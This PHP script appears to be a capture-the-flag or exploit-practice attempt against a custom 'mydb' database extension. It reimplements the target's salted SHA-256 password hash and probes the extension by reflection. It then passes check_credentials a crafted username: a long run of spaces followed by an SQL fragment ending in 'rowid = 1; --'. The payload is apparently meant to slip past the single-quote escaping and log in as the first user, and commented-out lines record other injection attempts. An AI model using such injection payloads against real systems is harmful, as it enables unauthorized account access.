<?php

dl('mydb.so');

function hashThatPassord($password) {
    $algo = 'sha256';
    $salt = 'saltyadamd';
    $hash = hash($algo, $password . $salt);
    $i = 1;
    while ($i < 20) {
        $hash = hash($algo, $hash);
        ++$i;
    }
    return $hash;
}

// $knownHash = '2c082424e9107d6b048cb1a95cdbede80745291df209a94afcfeaafaec2ae4a9';
// echo $knownHash, "\n";
// echo hashThatPassord("password"), "\n";

// print_r(get_extension_funcs('mydb'));
// $check_credentials = new ReflectionFunction('check_credentials');
// print_r($check_credentials->getParameters());
// $get_result = new ReflectionFunction('get_result');
// print_r($get_result->getParameters());

// $quote = json_decode('"\uff07"');
// $quote = "%d testing";
$username = "sarte                                                                                                           users where rowid = 1; --";
// $username = "sarte";
$password = "password";

// var_dump(str_replace("'", "''", $username));

// $userId = create_user($username, "password");
$userId = check_credentials(
//     // $username,
    str_replace("'", "''", $username),
    str_replace("'", "''", $password),
    function ($to_check, $extra_checks) {
//         // var_dump($to_check);
        $extra_checks($to_check);
        $result = get_result();
//         // var_dump($result);
//         // print "WTF\n";
        var_dump($result);
        return $result;
    }
);
print $userId;

echo "\n";
